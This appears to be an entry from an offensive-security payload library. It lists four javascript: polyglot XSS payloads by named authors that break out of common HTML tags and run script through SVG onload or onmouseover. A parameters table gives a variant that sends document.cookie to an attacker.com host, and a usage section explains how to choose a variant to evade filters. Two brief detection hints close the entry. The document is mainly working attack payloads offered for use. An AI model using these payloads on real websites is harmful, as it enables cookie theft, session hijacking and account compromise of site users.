---
id: cc707d65-4946-4145-a493-39f84c5d4553
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.286392+00:00'
updated_at: '2023-04-10T20:21:55.867714+00:00'
tags:
  - xss
  - polyglot
  - javascript
platforms:
  - Web
validated: true
---

# Author-Varied-JavaScript-Polyglot-XSS

## Code

```javascript
# by crlf
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=alert()//>

# by europa
javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

# by EdOverflow
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

# by h1/ragnar
javascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//>'
```

## Description

Collection of javascript: polyglot payloads from various authors, using tag breakers and SVG onmouseover/onload to execute alert after closing common HTML elements.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert() | POC; vary per author | onmouseover=location='http://attacker.com?'+encodeURIComponent(document.cookie) |

## Usage

Test each variant in JS contexts like href or form actions; select based on filter evasion needs.

## Detection

- javascript: protocol with extensive closers.
- SVG onload in non-image elements.

## Related

- [[procedures/Polyglot-XSS-Attack-using-SVG-Image-Injection]]
